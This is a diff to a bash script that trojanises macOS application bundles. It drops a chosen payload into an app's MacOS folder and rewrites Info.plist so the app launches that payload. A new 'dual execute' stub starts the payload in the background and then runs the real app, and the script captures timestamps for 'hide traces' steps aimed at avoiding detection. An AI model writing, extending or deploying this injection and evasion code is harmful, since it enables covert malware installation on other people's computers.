@@ -7,6 +7,17 @@
 # Is it possible to have two executabels launch on app init? That way it should be harder to detect the payload
 
 
+####
+## TODO
+#
+# Add option to launch both the main exec and payload via dropped shell script
+## Make this compitable with non shell executables
+#
+# Make inline compitable??? OR LATER?
+#
+#
+##
+####
 
 ## Workflow
 
@@ -95,17 +106,17 @@ if [ "$*" != "" ];then
 	for i in "$@";do				                           
 		case "$i" in	       
 		"$0") # If this script gets called as a standalone script the executable path will be supplied, so we skip it.
-		continue
+			continue
 		;;
 			-t=*|--target=*)
 				target="${i#*=}" && target="${target/\\/}" && target="${target%${target##*[![:space:]]}}"
-			;;
+				;;
 			-p=*|--payload=*)
 				payload="${i#*=}" && payload="${payload/\\/}" && payload="${payload%${payload##*[![:space:]]}}"
-			;;
+				;;
 			-nohide)
 				hidden=false
-			;;
+				;;
 			-f|--force)
 				exitOnObstructions=false
 				;;
@@ -114,6 +125,12 @@ if [ "$*" != "" ];then
 				;;
 			-pp=*|--payloadpermission=*)
 				permission="${i#*=}"
+				;;
+			-de|--dualexecute)
+				dualexec=true
+				;;
+			-den=*|--dualexecutename=*)
+				depn="${i#*=}"
 				;;
 		*)
 			catch_err "2" "" "$i"
@@ -149,9 +166,9 @@ b64gzdecode "H4sIAFRmb1oCA6VWW2+bSBR+Zn7FyRjXly2mTto8OOtoK1XVRttUkZK+NLUiCoMZGQ8
 ### 6 Gather information
 
 # Get original executable path
-originalExecutable="$target/Contents/MacOS/$(PlistKeyMod -f="$target/Contents/Info.plist" -k="CFBundleExecutable")" && originalExecutable="${originalExecutable/<string>/}" && originalExecutable="${originalExecutable/<\/string>/}"
+originalExecutable="$(PlistKeyMod -f="$target/Contents/Info.plist" -k="CFBundleExecutable")" && originalExecutable="${originalExecutable/<string>/}" && originalExecutable="${originalExecutable/<\/string>/}"
 
-reconTargets=("$target" "$target/Contents" "$target/Contents/Info.plist" "$target/Contents/MacOS" "$originalExecutable")
+reconTargets=("$target" "$target/Contents" "$target/Contents/Info.plist" "$target/Contents/MacOS" "$target/Contents/MacOS/$originalExecutable")
 	
 # Get timestamps and permissions for reconTargets
 for ((i=0;i<=$((${#reconTargets[@]}-1));i++));do
@@ -196,17 +213,33 @@ fi
 ### 8 Inject payload
 
 # Drop payload
-cp "$payload" "$target/Contents/MacOS/$payloadname" # DOES NOT COPY # BUG
+cp "$payload" "$target/Contents/MacOS/$payloadname"
 
-###################################################################################################
-###################################################################################################
-###################################################################################################
-###################################################################################################
-###################################################################################################
+# Rebind app to launch payload instead of old executable. If dualexec is enabled, drop it's stub too
 
-# Rebind app to launch payload instead of old executable
-PlistKeyMod -f="$target/Contents/Info.plist" -m="write" -k="CFBundleExecutable" -v="$payloadname"
-# Well that was much easier with that library...
+if [ "$dualexec" == "true" ];then
+	# Drop dual exec stub
+	
+	if [ -z "$depn" ];then
+		depn="$RANDOM"
+	fi
+	while [ -f "$target/Contents/MacOS/$depn" ];do
+		depn="$RANDOM$RANDOM"
+	done
+	
+	dep[0]='#!/bin/bash'
+	dep[1]='DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )"'
+	dep[2]="eval \"\$DIR/$payloadname\" &"
+	dep[3]="exec \"\$DIR/$originalExecutable\""
+	
+	for ((i=0;i<=$((${#dep[@]}-1));i++));do
+		echo "${dep[i]}" >> "$target/Contents/MacOS/$depn"
+	done
+	chmod "$permission" "$target/Contents/MacOS/$depn"
+	PlistKeyMod -f="$target/Contents/Info.plist" -m="write" -k="CFBundleExecutable" -v="$depn"
+else
+	PlistKeyMod -f="$target/Contents/Info.plist" -m="write" -k="CFBundleExecutable" -v="$payloadname"
+fi
 
 ### 9 Hide traces
 chmod "$permission" "$target/Contents/MacOS/$payloadname"
